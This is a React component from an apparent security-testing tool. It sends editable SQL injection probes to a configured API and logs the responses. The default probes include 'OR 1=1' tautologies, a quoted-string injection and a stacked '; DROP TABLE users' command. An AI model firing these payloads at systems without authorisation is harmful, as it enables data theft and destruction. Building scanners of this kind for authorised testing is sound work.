import { useState } from 'react'
import HttpClient from '../utils/HttpClient'

function SqlProbeModule({ config, reporter }) {
  const [options, setOptions] = useState({
    probes: [
      'GET /api/messages/1 OR 1=1',
      'GET /api/contacts/bob\' OR \'1\'=\'1/public-key',
      'GET /api/messages/123?limit=1; DROP TABLE users'
    ]
  })
  const [running, setRunning] = useState(false)
  const [results, setResults] = useState(null)

  const handleChange = (e) => {
    setOptions({ probes: e.target.value.split('\n') })
  }

  const start = async () => {
    setRunning(true)
    const httpClient = new HttpClient(config.baseUrl, config.authToken, config.useProxyAssist)

    for (const probe of options.probes) {
      const [method, path] = probe.split(' ')
      const res = method === 'POST' ? await httpClient.post(path, {}) : await httpClient.get(path)
      reporter.log({ module: 'sqlProbe', probe, status: res.status, body: res.data })
    }

    setRunning(false)
    setResults(reporter.summarize())
  }

  return (
    <div className="module">
      <h2>SQL Injection Prober</h2>
      <form>
        <label>Probes (one per line): <textarea value={options.probes.join('\n')} onChange={handleChange} /></label>
      </form>
      <button onClick={start} disabled={running}>Run Probes</button>
      {results && (
        <div>
          <h3>Results</h3>
          <ul>
            {results.recentEvents.map((e, i) => <li key={i}>{e.probe}: {e.status} - {JSON.stringify(e.body)}</li>)}
          </ul>
          <button onClick={() => navigator.clipboard.writeText(reporter.exportCSV())}>Copy CSV</button>
          <button onClick={() => navigator.clipboard.writeText(reporter.exportJSON())}>Copy JSON</button>
        </div>
      )}
    </div>
  )
}

export default SqlProbeModule